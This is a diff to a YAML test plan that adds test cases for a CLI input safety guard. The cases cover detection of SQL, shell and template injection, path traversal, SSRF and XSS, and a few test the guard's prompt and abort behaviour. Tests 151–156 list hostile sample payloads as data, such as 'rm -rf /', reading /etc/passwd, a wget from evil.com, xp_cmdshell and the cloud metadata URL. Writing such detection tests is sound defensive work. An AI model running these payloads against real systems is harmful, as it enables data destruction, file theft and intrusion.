@@ -2479,4 +2479,334 @@ tests:
     pass_criteria: Required feature17 size-reporting statements are present and consistent across docs
     automated: true
     automation_path: tests/test_docs.py::test_feature17_docs_cover_pack_size_reporting
+
+  - id: test149
+    title: InputGuardResult and InputWarning have correct structure
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Import InputGuardResult and InputWarning from kinnoo.input_guard
+      - step2: Create InputWarning with threat_category, description, and param_name fields
+      - step3: Create InputGuardResult with safe=True and empty warnings; verify fields
+      - step4: Create InputGuardResult with safe=False and a list of InputWarning; verify fields
+    expected: Both classes are constructible with expected fields and field types
+    pass_criteria: InputWarning has threat_category (str), description (str), param_name (str|None); InputGuardResult has safe (bool), warnings (list)
+    automated: true
+    automation_path: tests/test_input_guard.py::test_result_models_structure
     covers:
+      - feature: feature18
+        ac: AC4
+
+  - id: test150
+    title: get_default_guard returns protocol-compatible instance
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Call get_default_guard()
+      - step2: Verify returned instance has check() method accepting (value, input_type)
+      - step3: Verify returned instance has check_inputs() method accepting list of tuples
+      - step4: Call check("safe text") and verify it returns InputGuardResult
+    expected: Factory returns an object satisfying the InputGuard protocol contract
+    pass_criteria: Instance has check and check_inputs methods; check returns InputGuardResult
+    automated: true
+    automation_path: tests/test_input_guard.py::test_get_default_guard_protocol_contract
+    covers:
+      - feature: feature18
+        ac: AC4
+
+  - id: test151
+    title: SQL injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test UNION SELECT variant (e.g., "' UNION SELECT * FROM users--")
+      - step2: Test DROP TABLE variant (e.g., "'; DROP TABLE users;--")
+      - step3: Test tautology variant (e.g., "' OR 1=1--")
+      - step4: Test INSERT INTO variant (e.g., "'; INSERT INTO users VALUES('admin','pw');--")
+      - step5: Test DELETE FROM variant (e.g., "'; DELETE FROM users;--")
+      - step6: Test WAITFOR DELAY variant (e.g., "'; WAITFOR DELAY '0:0:5';--")
+      - step7: Test EXEC xp_ variant (e.g., "'; EXEC xp_cmdshell('whoami');--")
+    expected: Each SQL injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SQL_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test152
+    title: Shell injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test command chaining (e.g., "; rm -rf /")
+      - step2: Test command substitution $() (e.g., "$(cat /etc/passwd)")
+      - step3: Test backtick substitution (e.g., "`whoami`")
+      - step4: Test pipe to shell (e.g., "input | bash")
+      - step5: Test && chaining (e.g., "&& wget http://evil.com/payload")
+      - step6: Test null byte injection (e.g., "file.txt%00.jpg")
+    expected: Each shell injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SHELL_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_shell_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test153
+    title: Path traversal patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test basic traversal (e.g., "../../etc/passwd")
+      - step2: Test backslash traversal (e.g., "..\\..\\windows\\system32")
+      - step3: Test URL-encoded traversal (e.g., "%2e%2e%2fetc/passwd")
+      - step4: Test double-encoded traversal (e.g., "%252e%252e%252fetc/passwd")
+      - step5: Test absolute sensitive path (e.g., "/etc/passwd")
+    expected: Each path traversal variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category PATH_TRAVERSAL
+    automated: true
+    automation_path: tests/test_input_guard.py::test_path_traversal_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test154
+    title: SSRF patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test file:// protocol (e.g., "file:///etc/passwd")
+      - step2: Test gopher:// protocol (e.g., "gopher://127.0.0.1:25/")
+      - step3: Test dict:// protocol (e.g., "dict://localhost:11211/")
+      - step4: Test internal loopback IP (e.g., "http://127.0.0.1/admin")
+      - step5: Test private network IP (e.g., "http://10.0.0.1/internal")
+      - step6: Test AWS metadata endpoint (e.g., "http://169.254.169.254/latest/meta-data/")
+      - step7: Test localhost hostname (e.g., "http://localhost:8080/secret")
+    expected: Each SSRF variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category SSRF
+    automated: true
+    automation_path: tests/test_input_guard.py::test_ssrf_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test155
+    title: XSS patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test script tag (e.g., "<script>alert('xss')</script>")
+      - step2: Test javascript URI (e.g., "javascript:alert(1)")
+      - step3: Test event handler (e.g., '<img onerror="alert(1)" src=x>')
+      - step4: Test data URI (e.g., "data:text/html,<script>alert(1)</script>")
+    expected: Each XSS variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category XSS
+    automated: true
+    automation_path: tests/test_input_guard.py::test_xss_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test156
+    title: Template injection patterns individually detected
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Test Jinja2/Twig (e.g., "{{ 7*7 }}")
+      - step2: Test ERB (e.g., "<%= system('whoami') %>")
+      - step3: Test expression language (e.g., "${7*7}")
+    expected: Each template injection variant is detected by the guard
+    pass_criteria: Each input returns safe=False with at least one warning containing threat_category TEMPLATE_INJECTION
+    automated: true
+    automation_path: tests/test_input_guard.py::test_template_injection_patterns_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
+
+  - id: test157
+    title: Legitimate/safe inputs pass without warnings
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - step1: Test normal conversational text (e.g., "Hello, how are you today?")
+      - step2: Test text with numbers and punctuation (e.g., "The price is $19.99 for 3 items.")
+      - step3: Test text mentioning technical terms benignly (e.g., "Tell me about SQL databases and SELECT queries")
+      - step4: Test text with forward slashes in non-traversal context (e.g., "The ratio is 3/4 of the total")
+      - step5: Test text with URLs to public hosts (e.g., "Check out https://example.com for details")
+    expected: All legitimate inputs pass the guard without warnings
+    pass_criteria: Each input returns safe=True with an empty warnings list
+    automated: true
+    automation_path: tests/test_input_guard.py::test_safe_inputs_pass_clean
+    covers:
+      - feature: feature18
+        ac: AC6
+
+  - id: test158
+    title: "Type-aware filtering: input_type restricts pattern categories"
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - 'step1: Call check("../../etc/passwd", "file_path") — expect PATH_TRAVERSAL detected'
+      - 'step2: Call check("'' OR 1=1--", "file_path") — expect safe=True (SQL patterns skipped for file_path type)'
+      - 'step3: Call check("http://169.254.169.254/", "url") — expect SSRF detected'
+      - 'step4: Call check("../../etc/passwd", "url") — expect safe=True (path traversal skipped for url type)'
+      - 'step5: Call check("'' UNION SELECT *--", "id") — expect SQL_INJECTION detected'
+      - 'step6: Call check("../../etc/passwd", "id") — expect safe=True (path traversal skipped for id type)'
+    expected: Each input_type activates only the appropriate pattern categories
+    pass_criteria: Type-filtered checks detect threats in their scope and pass on out-of-scope patterns
+    automated: true
+    automation_path: tests/test_input_guard.py::test_type_aware_filtering
+    covers:
+      - feature: feature18
+        ac: AC7
+
+  - id: test159
+    title: "check_inputs multi-value aggregation with param names"
+    type: unit
+    preconditions: input_guard module available
+    steps:
+      - 'step1: Call check_inputs with mix of safe and unsafe inputs: [("query", "'' OR 1=1--", "text"), ("path", "safe/file.txt", "file_path"), ("url", "http://169.254.169.254/", "url")]'
+      - step2: Verify result is safe=False
+      - step3: Verify warnings include param_name for each flagged input
+      - step4: Verify safe input ("path") does not appear in warnings
+      - 'step5: Call check_inputs with all-safe inputs and verify safe=True with empty warnings'
+    expected: Multi-value checking aggregates warnings per parameter and reports overall safety
+    pass_criteria: Aggregated result is safe only if all inputs are safe; each warning carries the correct param_name
+    automated: true
+    automation_path: tests/test_input_guard.py::test_check_inputs_multi_value_aggregation
+    covers:
+      - feature: feature18
+        ac: AC8
+
+  - id: test160
+    title: "--no-guard flag skips safety check entirely"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run `kinnoo run <agent-dir> "' OR 1=1--" --no-guard`
+      - step3: Verify the agent executes without any safety warning or prompt
+    expected: With --no-guard, malicious-looking input is passed directly to the agent
+    pass_criteria: Agent runs successfully; no "[kinnoo] Input safety warning" in output
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_no_guard_flag_skips_check
+    covers:
+      - feature: feature18
+        ac: AC3
+
+  - id: test161
+    title: "Malicious input triggers warning; answering 'n' aborts"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run kinnoo run with malicious input (e.g., "'; DROP TABLE users;--") and simulate 'n' response to prompt
+      - step3: Verify "[kinnoo] Input safety warning:" appears in stderr
+      - step4: Verify the agent entrypoint was NOT executed (no agent output)
+      - step5: Verify exit code is non-zero
+    expected: Guard blocks execution after user rejects the warning
+    pass_criteria: Warning printed; agent not executed; exit code non-zero
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_malicious_input_abort_on_reject
+    covers:
+      - feature: feature18
+        ac: AC2
+
+  - id: test162
+    title: "Malicious input triggers warning; answering 'y' proceeds"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint that echoes input
+      - step2: Run kinnoo run with malicious input and simulate 'y' response to prompt
+      - step3: Verify "[kinnoo] Input safety warning:" appears in stderr
+      - step4: Verify the agent entrypoint WAS executed (agent output visible)
+    expected: Guard allows execution after user accepts the warning
+    pass_criteria: Warning printed; agent executed; agent output visible
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_malicious_input_proceed_on_accept
+    covers:
+      - feature: feature18
+        ac: AC2
+      - feature: feature18
+        ac: AC6
+
+  - id: test163
+    title: "Non-interactive stdin with malicious input auto-aborts"
+    type: integration
+    preconditions: kinnoo CLI installed, valid agent directory
+    steps:
+      - step1: Create a valid agent directory with a simple entrypoint
+      - step2: Run kinnoo run with malicious input in non-interactive mode (pipe stdin or close stdin)
+      - step3: Verify warning is printed and execution is aborted without prompting
+      - step4: Verify exit code is non-zero
+    expected: In non-interactive mode, malicious input causes immediate abort (fail-safe)
+    pass_criteria: Warning printed; "Non-interactive mode" message in stderr; exit code non-zero
+    automated: true
+    automation_path: tests/test_input_guard_integration.py::test_non_interactive_auto_aborts
+    covers:
+      - feature: feature18
+        ac: AC2
+
+  - id: test164
+    title: docs cover input safety guard feature
+    type: unit
+    preconditions: README.md and docs/manifest-schema-reference.md are present and readable
+    steps:
+      - step1: Verify README.md describes the input safety guard and --no-guard flag
+      - step2: Verify README.md mentions the threat categories (SQL injection, shell injection, path traversal, SSRF, XSS, template injection)
+      - step3: Verify docs describe the pluggable Protocol-based design and type-aware checking
+    expected: Documentation reflects feature18 input safety guard behavior
+    pass_criteria: Required feature18 documentation statements are present in README.md and docs
+    automated: true
+    automation_path: tests/test_docs.py::test_feature18_docs_cover_input_safety_guard
+    covers:
+      - feature: feature18
+        ac: AC1
+
+  - id: test165
+    title: SQL comment markers in benign text do not trigger warnings
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Check benign text containing a hash marker (for example explanatory markdown or tags) and verify safe result
+      - step2: Check benign text containing double-hyphen punctuation and verify safe result
+      - step3: Verify no SQL_INJECTION warning is returned for these benign cases
+    expected: Benign text with `#` or `--` is not over-classified as SQL injection
+    pass_criteria: Guard returns safe=True and no SQL_INJECTION warnings for benign marker-only inputs
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_comment_markers_benign_text_not_flagged
+    covers:
+      - feature: feature18
+        ac: AC6
+
+  - id: test166
+    title: SQL comment injection context remains detected after precision tuning
+    type: unit
+    preconditions: input_guard module with RegexInputGuard available
+    steps:
+      - step1: Check quote-plus-comment payload (for example username quote followed by SQL comment marker)
+      - step2: Check SQL keyword plus comment payload (for example SELECT/UNION context followed by SQL comment marker)
+      - step3: Verify SQL_INJECTION warning is returned for contextual comment-injection payloads
+    expected: SQL comment injection patterns with SQL-like context are still detected
+    pass_criteria: Guard returns safe=False with SQL_INJECTION warnings for contextual comment-injection inputs
+    automated: true
+    automation_path: tests/test_input_guard.py::test_sql_comment_injection_context_still_detected
+    covers:
+      - feature: feature18
+        ac: AC1
+      - feature: feature18
+        ac: AC5
